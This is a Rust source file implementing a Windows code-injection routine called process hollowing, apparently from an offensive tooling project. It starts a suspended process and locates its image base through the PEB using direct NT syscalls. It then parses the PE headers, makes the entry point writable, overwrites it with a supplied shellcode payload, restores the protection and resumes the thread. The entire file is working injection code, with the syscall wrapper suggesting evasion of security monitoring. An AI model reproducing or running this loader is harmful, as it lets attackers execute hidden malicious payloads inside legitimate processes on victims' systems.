use windows_sys::Win32::System::{
    Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
    Memory::PAGE_READWRITE,
    SystemServices::IMAGE_DOS_HEADER,
};

use super::super::process_utils::*;
use crate::{log, syscall};

pub unsafe fn process_hollowing(payload: &[u8]) {
    unsafe {
        log!("Starting process hollowing...");

        let pi = create_process(true, false, false).unwrap();
        log!("Created suspended process: PID = {}", pi.dwProcessId);

        // 1. Get thread context to extract PEB pointer
        let mut ctx: CONTEXT = core::mem::zeroed();
        ctx.ContextFlags = ntapi::winapi::um::winnt::CONTEXT_ALL;
        let status = syscall!("NtGetContextThread", pi.hThread, &mut ctx);
        if status < 0 {
            log!("NtGetContextThread failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }

        let peb_address = ctx.Rdx;
        let image_base_address_ptr = peb_address + 0x10;

        // 2. Read remote base address from PEB
        let mut remote_image_base: u64 = 0;
        let mut bytes_read = 0;
        let status = syscall!(
            "NtReadVirtualMemory",
            pi.hProcess,
            image_base_address_ptr,
            &mut remote_image_base,
            core::mem::size_of::<u64>(),
            &mut bytes_read
        );
        if status < 0 {
            log!("Failed to read ImageBase from PEB");
            terminate(pi.hProcess);
            return;
        }

        log!("Remote image base = 0x{:X}", remote_image_base);

        // 3. Read headers from remote image

        let mut headers_buf = [0u8; 0x1000];
        let status = syscall!(
            "NtReadVirtualMemory",
            pi.hProcess,
            remote_image_base,
            headers_buf.as_mut_ptr(),
            headers_buf.len(),
            &mut bytes_read
        );
        if status < 0 {
            log!("Failed to read PE headers");
            terminate(pi.hProcess);
            return;
        }

        // 4. Parse headers locally
        let dos_header = &*(headers_buf.as_ptr() as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D {
            log!("Invalid DOS header");
            terminate(pi.hProcess);
            return;
        }

        let nt_header_offset = dos_header.e_lfanew as usize;
        let nt_headers =
            &*(headers_buf.as_ptr().add(nt_header_offset) as *const IMAGE_NT_HEADERS64);
        if nt_headers.Signature != 0x4550 {
            log!("Invalid NT signature");
            terminate(pi.hProcess);
            return;
        }

        let entry_rva = nt_headers.OptionalHeader.AddressOfEntryPoint;
        let entry_addr = remote_image_base + entry_rva as u64;

        log!(
            "Remote entrypoint RVA = 0x{:X}, absolute address = 0x{:X}",
            entry_rva,
            entry_addr
        );

        let mut old_protect: u32 = 0;
        let mut region_size = payload.len() as usize;

        let status = syscall!(
            "NtProtectVirtualMemory",
            pi.hProcess,
            &mut (entry_addr as u64),
            &mut region_size,
            PAGE_READWRITE, // PAGE_EXECUTE_READWRITE
            &mut old_protect
        );
        if status < 0 {
            log!("NtProtectVirtualMemory failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }

        log!(
            "Changed protection of 0x{:X} (size 0x{:X}) to PAGE_READWRITE",
            entry_addr,
            region_size
        );

        // 5. Write shellcode to remote entrypoint
        let mut bytes_written = 0;
        let status = syscall!(
            "NtWriteVirtualMemory",
            pi.hProcess,
            entry_addr,
            payload.as_ptr(),
            payload.len(),
            &mut bytes_written
        );
        if status < 0 {
            log!("Failed to write shellcode to entrypoint (0x{:X})", status);
            terminate(pi.hProcess);
            return;
        }

        log!("Wrote {} bytes to entrypoint", bytes_written);

        region_size = payload.len() as usize; // revert the changes that kernel might have made on first protection

        let status = syscall!(
            "NtProtectVirtualMemory",
            pi.hProcess,
            &mut (entry_addr as u64),
            &mut region_size,
            old_protect,
            &mut old_protect
        );
        if status < 0 {
            log!("NtProtectVirtualMemory failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }

        log!("Reverted protection changes.");

        // 6. Resume process
        let status = syscall!("NtResumeThread", pi.hThread, core::ptr::null_mut::<u8>());
        if status < 0 {
            log!("NtResumeThread failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }
        log!("Done.");
    }
}
